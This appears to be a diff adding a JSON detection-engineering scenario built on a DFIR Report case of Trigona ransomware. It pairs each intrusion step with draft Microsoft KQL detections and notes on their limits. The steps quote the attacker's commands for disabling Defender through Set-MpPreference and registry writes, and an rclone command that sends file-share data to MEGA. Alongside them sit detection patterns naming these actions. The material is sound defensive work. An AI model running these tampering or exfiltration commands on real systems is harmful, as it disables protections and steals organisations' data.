@@ -1,0 +1,176 @@
+{
+  "_meta": {
+    "schemaVersion": "scenario.v1",
+    "status": "factual-layer-complete · detection-layer-pending-validation",
+    "author": "Matthias von Ehr",
+    "factsSource": "https://thedfirreport.com/2024/01/29/buzzing-on-christmas-eve-trigona-ransomware-in-3-hours/",
+    "factsSourceNote": "Forensic facts (timeline, techniques, tools, observed commands, IOCs) extracted from the DFIR Report writeup and restated in own words. The DFIR Report validates WHAT THE ATTACKER DID. It does NOT validate the detections below.",
+    "maturityModel": {
+      "theorized": "Detection logic is plausible but untested.",
+      "static-reviewed": "KQL syntactically valid, Defender/Sentinel tables+columns exist, ATT&CK mapping checked, FP risk named. Done in this scaffold. NOT proof it fires.",
+      "lab-tested": "Behavior emulated (Atomic Red Team / Caldera); query confirmed to fire and FP rate measured in a real tenant. YOURS to earn.",
+      "field-observed": "Detection has fired on this behavior in production. YOURS to earn."
+    },
+    "maturityRule": "maturityOverall = min(step maturity) for public credibility. Step 1 is 'theorized' (see its fpNotes), so strict-honest overall is 'theorized' until step 1's detection is validated or replaced. Resolve step 1, then set overall.",
+    "whatTheReportDoesNotContain": [
+      "KQL for the Microsoft stack - the report ships Sigma + network rules, not Defender/Sentinel KQL. Translation + tuning is your engineering.",
+      "Any proof those detections fire in YOUR tenant at an acceptable FP rate - that is lab/field validation, which only you can do.",
+      "Note: the report itself labels its own NetScan share-enum Sigma rule 'experimental' - even the source team separates documented-attack from validated-detection."
+    ]
+  },
+
+  "id": "trigona-3h",
+  "title": "Trigona Ransomware in 3 Hours",
+  "source": {
+    "name": "The DFIR Report",
+    "report": "Buzzing on Christmas Eve",
+    "url": "https://thedfirreport.com/2024/01/29/buzzing-on-christmas-eve-trigona-ransomware-in-3-hours/",
+    "case": "#19172",
+    "published": "2024-01-29",
+    "intrusionDate": "Dec 2022"
+  },
+  "threat": "Trigona Ransomware",
+  "dwellTime": "~2h49m initial access to encryption",
+  "stack": ["Defender XDR", "Microsoft Sentinel"],
+  "maturityOverall": "static-reviewed",
+
+  "summary": "A domain Administrator credential logged into an internet-exposed RDP host (no brute force), and 2h49m later Trigona was encrypting the whole network over SMB. Every step rode valid admin creds and built-in tooling, so each signal alone reads as legitimate administration. The incident is only defensible by chaining the steps on one identity within a 3h window. This is the cleanest possible proof that fidelity lives in correlation, not in any single query.",
+
+  "techniques": ["T1078","T1133","T1059.001","T1059.003","T1021.001","T1018","T1069.002","T1033","T1135","T1083","T1562.001","T1112","T1567.002","T1570","T1105","T1547.001","T1486"],
+
+  "steps": [
+    {
+      "order": 1,
+      "relTime": "T0",
+      "tactic": "Initial Access",
+      "technique": { "id": "T1133", "name": "External Remote Services", "secondary": [{ "id": "T1078", "name": "Valid Accounts" }] },
+      "whatHappened": "A single RDP connection from a Ukraine-geolocated IP (77.83.36[.]6, host WIN-L1MS2GT1R2G) logged in with valid credentials for the default domain Administrator account. No brute force. The logon was a resumed/unlocked session (Windows Event 4778, logon type 7), and prior remote logins to the same host appeared in the preceding weeks - suggesting an access broker or recurrent adversary.",
+      "detection": {
+        "tables": ["DeviceLogonEvents", "SigninLogs"],
+        "kqlId": "rdp-external-logon",
+        "kqlDraft": [
+          "DeviceLogonEvents",
+          "| where LogonType == \"RemoteInteractive\"",
+          "| where isnotempty(RemoteIP) and ipv4_is_private(RemoteIP) == false",
+          "| where AccountName == \"Administrator\"",
+          "| project Timestamp, DeviceName, AccountName, RemoteIP, RemoteDeviceName"
+        ],
+        "maturity": "theorized",
+        "fpNotes": "FP: remote admins, jump hosts, home office without VPN. CRITICAL FN RISK: this intrusion used a RESUMED/unlocked session (Event 4778 / type 7), which may NOT surface as 'RemoteInteractive' - the naive query above could MISS this exact case. Textbook gap between static-reviewed (looks right) and lab-tested (actually fires). Validate against 4624 type 7 + 4778 before trusting it."
+      }
+    },
+    {
+      "order": 2,
+      "relTime": "T0 +minutes",
+      "tactic": "Discovery",
+      "technique": { "id": "T1135", "name": "Network Share Discovery", "secondary": [{ "id": "T1018", "name": "Remote System Discovery" }, { "id": "T1069.002", "name": "Domain Groups" }, { "id": "T1033", "name": "System Owner/User Discovery" }] },
+      "whatHappened": "Native recon first: net group /domain, net group 'domain admins' /domain, whoami via PowerShell. Then SoftPerfect Netscan with a heavily customized config (netscan.xml) used as a central command tool. Netscan's share-enumeration checked write-access to shares, which generates Windows Security Event 5145 referencing a relative target 'delete[.]me'.",
+      "detection": {
+        "tables": ["SecurityEvent", "DeviceProcessEvents"],
+        "kqlId": "netscan-share-enum",
+        "kqlDraft": [
+          "SecurityEvent",
+          "| where EventID == 5145",
+          "| where RelativeTargetName has \"delete.me\"",
+          "| summarize hits=count() by Computer, SubjectUserName, IpAddress, bin(TimeGenerated, 5m)"
+        ],
+        "maturity": "static-reviewed",
+        "fpNotes": "Highest-value EARLY detection in the whole chain - fires before exfil/encryption. Requires Detailed File Share auditing (Event 5145) to be ingested; not on by default. The report ships an EXPERIMENTAL Sigma rule for exactly this - even the source team has not field-validated it."
+      }
+    },
+    {
+      "order": 3,
+      "relTime": "T0 +~20m",
+      "tactic": "Lateral Movement",
+      "technique": { "id": "T1021.001", "name": "Remote Desktop Protocol", "secondary": [{ "id": "T1570", "name": "Lateral Tool Transfer" }] },
+      "whatHappened": "Using the beachhead as a pivot, the actor opened RDP sessions to file servers and a backup server, copying their toolkit across. No exploitation needed - the domain Administrator credential granted local admin everywhere. RDP was the only lateral-movement technique used.",
+      "detection": {
+        "tables": ["DeviceLogonEvents"],
+        "kqlId": "lateral-rdp-pivot",
+        "kqlDraft": [
+          "DeviceLogonEvents",
+          "| where LogonType == \"RemoteInteractive\"",
+          "| where ipv4_is_private(RemoteIP) == true",
+          "| summarize targets=dcount(DeviceName), hosts=make_set(DeviceName) by AccountName, RemoteIP, bin(Timestamp, 30m)",
+          "| where targets > 1"
+        ],
+        "maturity": "static-reviewed",
+        "fpNotes": "FP: legitimate admin jump-host patterns, patch/management tooling. One account RDP-ing to multiple servers in a short window is the signal; tune the targets threshold per environment."
+      }
+    },
+    {
+      "order": 4,
+      "relTime": "T0 +~20-40m",
+      "tactic": "Defense Evasion",
+      "technique": { "id": "T1562.001", "name": "Impair Defenses: Disable or Modify Tools", "secondary": [{ "id": "T1112", "name": "Modify Registry" }] },
+      "whatHappened": "On each host, Defender was disabled via manual commands (the dropped DefenderOFF.bat was NOT executed): taskkill /F /IM MSASCuiL.exe; powershell Set-MpPreference -DisableRealtimeMonitoring $true; plus a series of REG ADD statements setting DisableAntiSpyware and disabling real-time protection. Same treatment applied to beachhead, both file servers, and the backup server.",
+      "detection": {
+        "tables": ["DeviceProcessEvents", "DeviceRegistryEvents"],
+        "kqlId": "defender-tamper",
+        "kqlDraft": [
+          "DeviceProcessEvents",
+          "| where ProcessCommandLine has_any (\"Set-MpPreference -DisableRealtimeMonitoring\", \"DisableAntiSpyware\", \"MSASCuiL.exe\")",
+          "| project Timestamp, DeviceName, AccountName, ProcessCommandLine"
+        ],
+        "maturity": "static-reviewed",
+        "fpNotes": "FP: legitimate IT maintenance, AV migration. Tradecraft lesson: the actor preferred MANUAL commands over the dropped .bat, so a detection keyed only on the script filename would miss it - key on the behavior (Set-MpPreference / Defender registry writes)."
+      }
+    },
+    {
+      "order": 5,
+      "relTime": "T0 +~1-2h",
+      "tactic": "Exfiltration",
+      "technique": { "id": "T1567.002", "name": "Exfiltration to Cloud Storage" },
+      "whatHappened": "Rclone (executed by batch scripts named with the Russian word for 'copy', kopiya) exfiltrated file-share data to Mega.io: rclone.exe copy \\\\[FILE SERVER]\\... MEGA:domain --multi-thread-streams 12 --transfers 12. The rclone config was encrypted (OPSEC to hide the exfil account). Dual extortion - data stolen before encryption.",
+      "detection": {
+        "tables": ["DeviceProcessEvents", "DeviceNetworkEvents"],
+        "kqlId": "exfil-rclone-mega",
+        "kqlDraft": [
+          "DeviceProcessEvents",
+          "| where FileName =~ \"rclone.exe\" or ProcessCommandLine has \"MEGA:\"",
+          "| project Timestamp, DeviceName, AccountName, ProcessCommandLine",
+          "// pair with DeviceNetworkEvents to mega.io / mega.co.nz for corroboration"
+        ],
+        "maturity": "static-reviewed",
+        "fpNotes": "FP: legitimate rclone users, sanctioned cloud sync. Renaming rclone.exe defeats the FileName match - corroborate with the network leg (mega.io) and the multi-thread copy command line."
+      }
+    },
+    {
+      "order": 6,
+      "relTime": "T0 +2h49m",
+      "tactic": "Impact",
+      "technique": { "id": "T1486", "name": "Data Encrypted for Impact", "secondary": [{ "id": "T1547.001", "name": "Registry Run Keys / Startup Folder" }] },
+      "whatHappened": "Trigona (build_redacted.exe) was staged and executed on each accessible host via the RDP sessions, then propagated to all network-accessible hosts over SMB. It set an HKCU Run key for persistence and dropped the ransom note how_to_decrypt.hta. Encryption began ~2h49m after initial access.",
+      "detection": {
+        "tables": ["DeviceFileEvents"],
+        "kqlId": "impact-mass-encryption",
+        "kqlDraft": [
+          "DeviceFileEvents",
+          "| where ActionType in (\"FileRenamed\",\"FileModified\") or FileName =~ \"how_to_decrypt.hta\"",
+          "| summarize affected=dcount(FolderPath), note=countif(FileName =~ \"how_to_decrypt.hta\") by DeviceName, bin(Timestamp, 5m)",
+          "| where affected > 200 or note > 0"
+        ],
+        "maturity": "static-reviewed",
+        "fpNotes": "FP: backup/sync software, bulk file ops. LOUDEST but LATEST signal - by 2h49m the damage is done. The whole point of the correlation below is to fire hours before this step."
+      }
+    }
+  ],
+
+  "correlation": {
+    "linkingEntity": "AccountSid (domain Administrator) + DeviceName",
+    "timeWindow": "3h sliding",
+    "inputs": 6,
+    "output": "1 high-fidelity incident",
+    "sequence": ["external RDP (valid admin)","Netscan share-enum (5145)","Defender disabled","lateral RDP to servers","Rclone to Mega.io","mass SMB encryption"],
+    "narrative": "Every primitive here is individually defensible: an admin logs in by RDP, an admin runs net group, an admin touches Defender during 'maintenance', rclone might be sanctioned, file writes happen constantly. None warrants a page on its own. Joined on the SAME Administrator identity within a 3h window, the ordered sequence - external foothold, share-enum, defense tampering, server-to-server RDP, cloud exfil, mass encryption - does not occur in benign operations. The fidelity is created by the join, not by any single query.",
+    "architectNote": "Key the correlation on IDENTITY, not source IP. This actor rotated IPs mid-intrusion (77.83.36[.]6 -> 193.106.31[.]9, ~2.5h in) using the same credential and the same playbook; an IP-keyed rule would split one incident into two and lower every per-IP score below threshold. In the Microsoft stack this is incident-grouping / a scheduled analytics rule keyed on the entity; document WHICH layer (Sentinel analytics vs Defender XDR attack story) owns the correlation - that is the architect-level decision."
+  },
+
+  "blindSpots": [
+    "Step 1 false-negative: the initial logon was a resumed/unlocked session (Event 4778 / logon type 7), which a naive 'RemoteInteractive' RDP query can miss entirely.",
+    "IP rotation mid-intrusion (77.83.36[.]6 -> 193.106.31[.]9) breaks any source-IP-based correlation; key on identity instead.",
+    "Almost everything used valid domain Administrator creds + built-in tools (living off the land), so individual signals are nearly indistinguishable from legitimate administration.",
+    "Several detection-worthy scripts (newuser.bat, openrdp.bat, DefenderOFF.bat) were DROPPED but NOT executed - file-creation detections would fire, process-execution detections would not. Your detection layer choice changes what you catch.",
+    "Detailed File Share auditing (Event 5145) is off by default - the best early detection (step 2) is blind unless that telemetry is ingested."
+  ]
+}
